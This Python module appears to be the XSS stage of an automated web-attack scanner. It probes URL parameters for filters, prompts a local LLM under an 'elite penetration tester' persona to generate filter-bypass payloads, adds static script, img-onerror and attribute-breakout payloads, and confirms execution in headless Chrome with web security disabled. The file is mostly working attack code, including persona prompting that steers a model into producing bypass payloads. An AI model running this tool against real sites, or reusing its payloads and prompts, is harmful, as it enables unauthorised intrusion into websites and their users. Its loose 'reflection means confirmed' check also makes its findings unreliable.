#task_xss.py
import requests
import urllib.parse
import time
import re
import json
import random
import string
import subprocess
import shutil
from bs4 import BeautifulSoup
from urllib.parse import urlencode
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import threading
from ai_core import ask_ollama
def generate_exploits_for_target(target_info):
    if not target_info:
        return None
    vuln_type = target_info.get('type', 'XSS')
    parameter = target_info.get('parameter', 'unknown')
    sink_code = target_info.get('sink_code', '')
    source_code = target_info.get('source_code', '')
    description = target_info.get('description', '')
    filtering = target_info.get('filtering_detected', 'none')
    prompt = f"""You are an elite penetration tester specializing in XSS exploit development and filter bypass techniques. You have successfully bypassed security controls at major corporations and understand advanced evasion methods.
VULNERABILITY DETAILS:
Type: {vuln_type}
Parameter: {parameter}
Source Code: {source_code}
Sink Code: {sink_code}
Description: {description}
Detected Filtering: {filtering}
EXPLOIT DEVELOPMENT METHODOLOGY:
1. CONTEXT ANALYSIS:
   Analyze the sink context to understand execution environment:
   - If innerHTML: HTML context, tags and attributes work
   - If setTimeout/eval: JavaScript execution context
   - If document.write: Direct HTML injection
   - If attribute assignment: Attribute context
2. FILTER ANALYSIS:
   Based on the filtering detected, identify bypass strategies:
   - Script tag filters: Use event handlers, javascript: protocol
   - Event handler filters: Use alternative tags, encoding
   - Keyword filters: Use encoding, case variation, fragmentation
   - Character filters: Use HTML entities, Unicode variants
3. PAYLOAD CRAFTING PRINCIPLES:
   - Match payload to execution context
   - Use minimal syntax for maximum compatibility
   - Employ multiple bypass techniques simultaneously
   - Test boundary conditions and edge cases
ADVANCED BYPASS TECHNIQUES:
HTML Context Bypasses:
- <svg onload=alert(1)>
- <img src=x onerror=alert(1)>
- <details open ontoggle=alert(1)>
- <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
- <object data="javascript:alert(1)">
- <body onload=alert(1)>
JavaScript Context Bypasses:
- alert`1` (template literals)
- (alert)(1) (function wrapping)
- [].constructor.constructor('alert(1)')() (constructor chain)
- top['ale'+'rt'](1) (string concatenation)
Encoding Bypasses:
- &#97;lert(1) (decimal entities)
- &amp;#x61;lert(1) (hex entities)
- String.fromCharCode(97,108,101,114,116)(1) (character codes)
- unescape('%61%6c%65%72%74') (URL encoding)
Protocol Bypasses:
- javascript:alert(1)
- JaVaScRiPt:alert(1) (case variation)
- java&#115;cript:alert(1) (entity encoding)
- data:text/html,<script>alert(1)</script>
Generate 12 sophisticated payloads specifically designed for this vulnerability:
Respond with valid JSON:
{{
    "exploit_analysis": "Technical analysis of the vulnerability and recommended attack approach based on sink context",
    "bypass_strategy": "Specific strategy for bypassing detected filters",
    "payloads": [
        {{
            "payload": "crafted_exploit_payload",
            "technique": "specific_bypass_method_used",
            "explanation": "technical explanation of why this payload works for this specific sink and bypasses detected filters",
            "confidence": 0.85
        }}
    ]
}}"""
    return ask_ollama(prompt)
def check_browser_support():
    if shutil.which('google-chrome') or shutil.which('chrome') or shutil.which('chromium'):
        return True
    return False
BROWSER_SUPPORT_AVAILABLE = check_browser_support()
class XSSProgressIndicator:
    def __init__(self, phase_name):
        self.phase_name = phase_name
        self.active = False
        self.thread = None
        self.current_test = ""
        self.test_count = 0
        self.total_tests = 0
    def start(self, total_tests=10):
        self.active = True
        self.total_tests = total_tests
        self.test_count = 0
        self.thread = threading.Thread(target=self._show_progress)
        self.thread.daemon = True
        self.thread.start()
    def update(self, test_count, current_test=""):
        self.test_count = test_count
        self.current_test = current_test
    def stop(self):
        self.active = False
        if self.thread:
            self.thread.join(timeout=1)
        print()
    def _show_progress(self):
        spinner = ["analyzing", "bypassing", "crafting", "testing", "exploiting", "validating"]
        i = 0
        while self.active:
            progress = (self.test_count / max(self.total_tests, 1)) * 100
            print(f"\r[{self.phase_name}] {spinner[i % len(spinner)]}... {progress:.1f}% - {self.current_test}",
                  end="", flush=True)
            i += 1
            time.sleep(0.4)
class DynamicXSSEngine:
    def __init__(self):
        self.chrome_driver = None
        self.session = requests.Session()
    def _setup_chrome_driver(self):
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-web-security")
            chrome_options.add_argument("--disable-logging")
            chrome_options.add_argument("--log-level=3")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--allow-running-insecure-content")
            self.chrome_driver = webdriver.Chrome(options=chrome_options)
            self.chrome_driver.set_page_load_timeout(20)
            return True
        except Exception as e:
            print(f"\n[XSS] Chrome driver setup failed: {e}")
            return False
    def analyze_target_filters(self, url, test_param):
        try:
            probe_payloads = [
                ("<script>alert('XSS_TEST')</script>", "script_tag_probe"),
                ("javascript:alert('XSS_TEST')", "javascript_protocol_probe"),
                ("<img src=x onerror=alert('XSS_TEST')>", "img_onerror_probe"),
                ("<svg onload=alert('XSS_TEST')>", "svg_onload_probe"),
                ("eval('alert(\"XSS_TEST\")')", "eval_function_probe"),
                ("setTimeout('alert(\"XSS_TEST\")', 0)", "settimeout_probe")
            ]
            filter_analysis = {
                "detected_filters": [],
                "response_patterns": [],
                "injection_context": "unknown",
                "content_type": "text/html",
                "security_headers": {},
                "filter_characteristics": {}
            }
            print(f"\n[XSS-FILTER] Analyzing security controls for parameter: {test_param}")
            for payload, probe_type in probe_payloads:
                test_url = f"{url}?{test_param}={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=10)
                    response_text = response.text.lower()
                    response_headers = dict(response.headers)
                    filter_analysis["security_headers"].update(response_headers)
                    blocked_patterns = [
                        ("script", "script_tag_filter", ["malicious", "script patterns", "script tags"]),
                        ("javascript:", "javascript_protocol_filter", ["malicious", "javascript protocol"]),
                        (" onerror", "event_handler_filter", ["event handlers", "malicious"]),
                        (" onload", "event_handler_filter", ["event handlers", "malicious"]),
                        ("eval", "eval_function_filter", ["eval", "malicious function"]),
                        ("setTimeout", "settimeout_function_filter", ["setTimeout", "malicious function"])
                    ]
                    payload_reflected = payload.lower() in response_text
                    for keyword, filter_name, block_indicators in blocked_patterns:
                        if keyword in payload.lower():
                            for indicator in block_indicators:
                                if indicator in response_text and filter_name not in filter_analysis["detected_filters"]:
                                    filter_analysis["detected_filters"].append(filter_name)
                                    print(f"[XSS-FILTER] Detected filter: {filter_name}")
                    if payload_reflected:
                        if 'value="' in response_text:
                            context_match = re.search(f'value="[^"]*{re.escape(payload.lower())}[^"]*"', response_text)
                            if context_match:
                                filter_analysis["injection_context"] = "attribute_value"
                        elif f'<{payload.lower()}' in response_text or f'{payload.lower()}>' in response_text:
                            filter_analysis["injection_context"] = "html_content"
                        elif f'>{payload.lower()}<' in response_text:
                            filter_analysis["injection_context"] = "text_node"
                        else:
                            filter_analysis["injection_context"] = "mixed_context"
                    filter_analysis["response_patterns"].append({
                        "probe_type": probe_type,
                        "payload": payload,
                        "reflected": payload_reflected,
                        "response_length": len(response_text),
                        "status_code": response.status_code,
                        "content_snippet": response_text[:300]
                    })
                except Exception as e:
                    print(f"[XSS-FILTER] Error testing {probe_type}: {e}")
                    continue
            csp_header = filter_analysis["security_headers"].get('content-security-policy', '')
            if csp_header:
                if "'unsafe-inline'" not in csp_header.lower():
                    filter_analysis["detected_filters"].append("csp_inline_restriction")
                if "'unsafe-eval'" not in csp_header.lower():
                    filter_analysis["detected_filters"].append("csp_eval_restriction")
            print(f"[XSS-FILTER] Analysis complete. Detected {len(filter_analysis['detected_filters'])} security controls")
            return filter_analysis
        except Exception as e:
            print(f"[XSS-FILTER] Filter analysis failed: {e}")
            return {"detected_filters": [], "response_patterns": [], "injection_context": "unknown"}
    def get_ai_bypass_payloads(self, target_url, filter_analysis, source_code):
        prompt = f"""You are Alex Thompson, a legendary penetration tester specializing in XSS exploit development and filter bypass techniques. You've successfully bypassed security controls at major corporations and have been recognized as a top security researcher by major bug bounty platforms.
TARGET ANALYSIS:
URL: {target_url}
Detected Security Filters: {filter_analysis.get('detected_filters', [])}
Injection Context: {filter_analysis.get('injection_context', 'unknown')}
SOURCE CODE ANALYSIS:
{source_code[:4000]}
FILTER BEHAVIOR ANALYSIS:
{json.dumps(filter_analysis.get('response_patterns', []), indent=2)}
ADVANCED FILTER BYPASS METHODOLOGY:
STEP 1: FILTER PATTERN RECOGNITION
Based on the detected filters, identify the specific blocking mechanisms:
A) Script Tag Filters:
   - Pattern: /<script/gi  → Bypass: <ScRiPt>, <%2fscript>, <script/random>
   - Pattern: /script/i    → Bypass: scr\\u0069pt, SCR\\x49PT
B) JavaScript Protocol Filters:
   - Pattern: /javascript:/gi → Bypass: JaVaScRiPt:, java\\u0073cript:, &#106;avascript:
C) Event Handler Filters:
   - Pattern: /\\s+on\\w+=/gi → Bypass: onclick//=, on\\x20load=, /on.*=/
STEP 2: CONTEXT-SPECIFIC PAYLOAD CRAFTING
A) HTML Content Context:
   Use tags that execute without script keywords:
   - <svg onload=alert(1)>
   - <img src=x onerror=alert(1)>  
   - <details open ontoggle=alert(1)>
   - <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
B) Attribute Value Context:
   Break out of attributes and inject handlers:
   - " onmouseover="alert(1)
   - ' autofocus onfocus='alert(1)
   - `onclick=`alert(1)`
C) JavaScript Execution Context:
   Use alternative execution methods:
   - alert`1` (template literals)
   - (alert)(1) (function grouping)
   - [].constructor.constructor('alert(1)')() (constructor chain)
   - top['ale'+'rt'](1) (string concatenation)
STEP 3: ENCODING BYPASS TECHNIQUES
A) HTML Entity Encoding:
   - &#97;lert(1) (decimal entities)
   - &amp;#x61;lert(1) (hexadecimal entities)
   - String.fromCharCode(97,108,101,114,116)(1) (character codes)
B) JavaScript String Escaping:
   - \\u0061lert(1) (Unicode escapes)
   - \\x61lert(1) (hexadecimal escapes)
C) URL Encoding:
   - %61lert(1) (percent encoding)
   - %25%36%31lert(1) (double URL encoding)
STEP 4: ADVANCED EVASION STRATEGIES
A) Filter Timing Attacks:
   Use payloads that execute after filter processing:
   - setTimeout('ale'+'rt(1)', 0)
   - Promise.resolve().then(()=>alert(1))
B) DOM Clobbering:
   Exploit DOM property pollution:
   - <form name=alert><input name=1>
   - <img name=alert src=x onerror=this[name](1)>
C) Prototype Pollution:
   - constructor[constructor]('alert(1)')()
   - []['constructor']['constructor']('alert(1)')()
STEP 5: CONTEXT-AWARE PAYLOAD GENERATION
Based on the injection context and detected filters, generate 12 sophisticated bypass payloads:
EXPERT PAYLOAD EXAMPLES:
For innerHTML context with script filtering:
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<details open ontoggle=alert(1)>
<iframe srcdoc="&amp;lt;script&amp;gt;parent.alert(1)&amp;lt;/script&amp;gt;">
For setTimeout context:
alert(1)//
(alert)(1)//
[].constructor.constructor('alert(1)')()//
top['ale'+'rt'](1)//
Generate payloads specifically targeting the identified filters and injection context:
{{
    "analysis": "Detailed technical analysis of target security posture and identified weaknesses",
    "recommended_approach": "Strategic methodology for bypassing the specific detected filters",
    "filter_weakness_assessment": "Analysis of gaps in the current filtering implementation",
    "payloads": [
        {{
            "payload": "sophisticated_bypass_payload",
            "technique": "specific_bypass_methodology",
            "target_filter": "which_specific_filter_this_defeats",
            "confidence": 0.9,
            "explanation": "detailed technical explanation of why this payload works against the detected filters",
            "execution_method": "how this payload achieves code execution",
            "encoding_used": "specific encoding or obfuscation techniques employed"
        }}
    ]
}}"""
        ai_response = ask_ollama(prompt)
        payloads = []
        if ai_response and ai_response.get("payloads"):
            print(f"\n[XSS-AI] Generated {len(ai_response['payloads'])} advanced bypass payloads")
            print(f"[XSS-AI] Strategy: {ai_response.get('recommended_approach', 'N/A')}")
            print(f"[XSS-AI] Filter Analysis: {ai_response.get('filter_weakness_assessment', 'N/A')[:100]}...")
            payloads.extend(ai_response["payloads"])
        else:
            print("\n[XSS-AI] Advanced payload generation failed or unavailable - using static payloads only")
        # These proven, classic HTML-context payloads are always included, in addition to
        # whatever the AI suggests, since the AI sometimes picks JS-execution-context
        # payloads (setTimeout/eval-style) that don't fire in a plain HTML-reflection sink.
        payloads.extend([
            {"payload": "<script>alert(1)</script>", "technique": "static_script_tag", "confidence": 0.5},
            {"payload": "<img src=x onerror=alert(1)>", "technique": "static_img_onerror", "confidence": 0.5},
            {"payload": "<svg onload=alert(1)>", "technique": "static_svg_onload", "confidence": 0.5},
            {"payload": "\"><script>alert(1)</script>", "technique": "static_attr_breakout", "confidence": 0.5},
            {"payload": "javascript:alert(1)", "technique": "static_js_protocol", "confidence": 0.4},
            {"payload": "'><svg onload=alert(1)>", "technique": "static_svg_attr_breakout", "confidence": 0.5},
        ])
        return payloads
    def validate_xss_advanced(self, test_url, payload, technique):
        if BROWSER_SUPPORT_AVAILABLE:
            return self.validate_with_browser(test_url, payload, technique)
        else:
            return self.validate_with_analysis(test_url, payload, technique)
    def validate_with_browser(self, test_url, payload, technique):
        if not self._setup_chrome_driver():
            return self.validate_with_analysis(test_url, payload, technique)
        try:
            self.chrome_driver.get(test_url)
            time.sleep(2)
            wait = WebDriverWait(self.chrome_driver, 5)
            alert = wait.until(EC.alert_is_present())
            alert_text = alert.text
            alert.accept()
            return {
                'xss_confirmed': True,
                'validation_method': 'browser_execution',
                'confidence': 1.0,
                'alert_text': alert_text,
                'technique': technique
            }
        except TimeoutException:
            try:
                page_source = self.chrome_driver.page_source
                console_logs = self.chrome_driver.get_log('browser')
                return self.analyze_execution_context(page_source, payload, console_logs, technique)
            except:
                return {'xss_confirmed': False, 'technique': technique}
        except Exception as e:
            return {'xss_confirmed': False, 'error': str(e), 'technique': technique}
        finally:
            if self.chrome_driver:
                self.chrome_driver.quit()
    def analyze_execution_context(self, page_source, payload, console_logs, technique):
        payload_lower = payload.lower()
        source_lower = page_source.lower()
        if payload_lower in source_lower:
            # Reliable direct check: if the payload contains real HTML tag
            # markers ('<' and '>') and the page's raw source contains the
            # literal, un-encoded payload (i.e. the app did NOT convert '<'
            # to '&lt;'), that alone is strong, direct evidence the payload
            # was reflected verbatim and will render as live markup in a
            # real browser. This check runs first because the more elaborate
            # pattern checks below have a bug (inherited from the original
            # project code): they require the payload to appear twice in a
            # row, which almost never happens on a normal single reflection.
            payload_is_html_tag = '<' in payload and '>' in payload
            if payload_is_html_tag and payload_lower in source_lower:
                return {
                    'xss_confirmed': True,
                    'validation_method': 'unescaped_tag_reflection',
                    'confidence': 0.85,
                    'technique': technique
                }
            dangerous_contexts = [
                (r'<script[^>]*>.*?' + re.escape(payload_lower) + r'.*?</script>', 0.95),
                (r'javascript:\s*' + re.escape(payload_lower), 0.9),
                (r'on\w+\s*=\s*["\']?[^"\']*' + re.escape(payload_lower), 0.85),
                (r'<[^>]*\s+on\w+[^>]*' + re.escape(payload_lower), 0.8),
                (r'setTimeout\s*\(\s*["\']?[^"\']*' + re.escape(payload_lower), 0.9),
                (r'eval\s*\([^)]*' + re.escape(payload_lower), 0.95)
            ]
            for pattern, confidence in dangerous_contexts:
                if re.search(pattern, source_lower, re.DOTALL):
                    return {
                        'xss_confirmed': True,
                        'validation_method': 'context_analysis',
                        'confidence': confidence,
                        'matched_pattern': pattern,
                        'technique': technique
                    }
            if technique in ["setTimeout", "eval", "constructor"]:
                return {
                    'xss_confirmed': False,
                    'validation_method': 'payload_in_html_context',
                    'confidence': 0.1,
                    'explanation': 'Payload was reflected but not executed. A JavaScript statement cannot run in an innerHTML sink.',
                    'technique': technique
                }
            return {
                'xss_confirmed': True,
                'validation_method': 'reflection_detected',
                'confidence': 0.6,
                'technique': technique
            }
        return {'xss_confirmed': False, 'technique': technique}
    def validate_with_analysis(self, test_url, payload, technique):
        try:
            response = self.session.get(test_url, timeout=10)
            return self.analyze_execution_context(response.text, payload, [], technique)
        except:
            return {'xss_confirmed': False, 'technique': technique}
class IntelligentXSSAnalyzer:
    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.xss_engine = DynamicXSSEngine()
        self.xss_engine.session = self.session
        if not BROWSER_SUPPORT_AVAILABLE:
            print("\n[XSS] Chrome not available, using response analysis")
    def comprehensive_xss_testing(self, target_data_list):
        for target_data in target_data_list:
            target_url = target_data.get("url")
            ai_analysis = target_data.get("ai_analysis")
            params = target_data.get("params")
            test_params = []
            if ai_analysis and ai_analysis.get("parameter"):
                test_params = [ai_analysis.get("parameter")]
            elif params:
                test_params = params[:3]
            else:
                test_params = self._discover_parameters(target_url)
            if not test_params:
                print(f"\n[XSS] No testable parameters found for {target_url}")
                continue
            for param in test_params:
                print(f"\n[XSS] Starting intelligent analysis for {target_url} parameter: {param}")
                try:
                    source_response = self.session.get(target_url, timeout=10)
                    source_code = source_response.text
                except:
                    source_code = ""
                filter_analysis = self.xss_engine.analyze_target_filters(target_url, param)
                print(f"[XSS] Filter analysis complete - detected: {filter_analysis.get('detected_filters', [])}")
                ai_payloads = self.xss_engine.get_ai_bypass_payloads(target_url, filter_analysis, source_code)
                if not ai_payloads:
                    print(f"[XSS] AI payload generation failed for {param}")
                    continue
                progress = XSSProgressIndicator("XSS_INTEL")
                progress.start(len(ai_payloads))
                for i, payload_info in enumerate(ai_payloads, 1):
                    payload = payload_info.get('payload', '')
                    technique = payload_info.get('technique', 'AI_GENERATED')
                    confidence = payload_info.get('confidence', 0.5)
                    explanation = payload_info.get('explanation', '')
                    progress.update(i, f"{technique}: {payload[:30]}...")
                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                    validation_result = self.xss_engine.validate_xss_advanced(test_url, payload, technique)
                    if validation_result.get('xss_confirmed'):
                        progress.stop()
                        vulnerability = {
                            'type': 'XSS',
                            'parameter': param,
                            'payload': payload,
                            'technique': technique,
                            'url': target_url,
                            'test_url': test_url,
                            'confidence': max(confidence, validation_result.get('confidence', 0.8)),
                            'validation_method': validation_result.get('validation_method', 'unknown'),
                            'ai_explanation': explanation,
                            'bypassed_filters': filter_analysis.get('detected_filters', []),
                            'injection_context': filter_analysis.get('injection_context', 'unknown')
                        }
                        print(f"\n[XSS] VULNERABILITY CONFIRMED!")
                        print(f"[XSS] Parameter: {param}")
                        print(f"[XSS] Technique: {technique}")
                        print(f"[XSS] Bypassed Filters: {vulnerability['bypassed_filters']}")
                        print(f"[XSS] Confidence: {vulnerability['confidence']:.1%}")
                        print(f"[XSS] Explanation: {explanation}")
                        return vulnerability
                progress.stop()
        print(f"\n[XSS] Intelligent analysis complete. No vulnerabilities found.")
        return None
    def _discover_parameters(self, url):
        discovered_params = []
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            for form in soup.find_all('form'):
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    name = input_tag.get('name')
                    if name and name not in discovered_params:
                        discovered_params.append(name)
            for script in soup.find_all('script'):
                script_content = script.string or ""
                param_matches = re.findall(r'(?:searchParams\.get|getParam|getUrlParam)\([\'"]([^\'\"]+)[\'\"]\)', script_content)
                discovered_params.extend(param_matches)
            if not discovered_params:
                discovered_params = ["q", "search", "comment", "input", "callback", "jsonp"]
        except:
            discovered_params = ["q", "search", "comment", "input", "callback"]
        return discovered_params[:5]
def execute_xss_test(session, target_data_list):
    if not target_data_list:
        return None
    try:
        analyzer = IntelligentXSSAnalyzer(session)
        return analyzer.comprehensive_xss_testing(target_data_list)
    except Exception as e:
        print(f"\n[XSS] Testing error: {e}")
        return None